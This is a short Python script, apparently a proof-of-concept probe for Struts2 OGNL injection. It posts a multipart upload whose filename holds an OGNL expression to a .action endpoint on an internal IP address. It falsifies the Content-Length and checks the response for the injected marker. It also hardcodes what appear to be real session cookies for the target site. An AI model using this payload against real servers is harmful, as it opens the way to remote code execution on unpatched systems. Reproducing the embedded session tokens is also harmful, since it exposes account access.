#coding=utf8

headers = {'cookie':'PD-H-SESSION-ID=4_1_nEkjFVUg5Tf92uiF5SSCDs87Y+GMXCIl0sgFfTDe5yxYSD62; BIGipServerpool_webseal=3876044298.20480.0000; BIGipServerpool_webportal=3959930378.14119.0000; PD_STATEFUL_7b63010e-9969-11e5-a1c6-624317b13302=%2Fxeai; JSESSIONID=0000jvfsmWZZdPd1uIa0XoEPRXn:-1; PD_STATEFUL_6699702c-0269-11e7-8ea9-624317b13302=%2Fzydd'}
proxies = {'http':'http://127.0.0.1:1111','https':'https://127.0.0.1:1111'}
import requests
s = requests.session()
f={'upload':("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('justatest','23333')}","233333",'text/plain')}
req = requests.Request('POST',"http://10.190.7.230/zyddcs/manage/indexPage.action?command=ls",files=f,headers=headers)
prepped = req.prepare()
prepped.headers['Content-Length']='10000' #修改已经计算好了的
r = s.send(prepped)#发送构造好的请求
print(r.status_code)
print(r.headers)
if '233333'.encode() in r.content:
    print(22222222)
